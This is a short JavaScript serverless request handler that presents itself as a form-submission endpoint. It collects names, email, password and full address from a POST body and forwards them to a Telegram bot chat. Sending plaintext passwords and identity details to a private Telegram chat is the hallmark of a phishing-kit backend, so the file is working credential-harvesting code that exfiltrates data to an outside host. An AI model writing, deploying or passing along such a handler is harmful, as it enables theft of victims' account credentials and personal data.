const { TELEGRAM_BOT_TOKEN, CHAT_ID } = process.env;

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      // Extract form data from the request body
      const { firstName, lastName, email, password, address, city, state, zip } = req.body;

      // Construct the message to send to Telegram
      const message = `
        📝 New Form Submission:
        ------------------------
        First Name: ${firstName}
        Last Name: ${lastName}
        Email: ${email}
        Password: ${password}
        Address: ${address}
        City: ${city}
        State: ${state}
        ZIP: ${zip}
      `;

      // Send the message to Telegram
      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      });

      // Check if the Telegram API request was successful
      if (response.ok) {
        return res.status(200).json({ success: true, message: 'Data sent to Telegram!' });
      } else {
        console.error('Telegram API Error:', await response.text());
        return res.status(500).json({ success: false, message: 'Failed to send data to Telegram.' });
      }
    } catch (error) {
      console.error('Error:', error);
      return res.status(500).json({ success: false, message: 'An unexpected error occurred.' });
    }
  } else {
    // Handle unsupported HTTP methods
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }
}
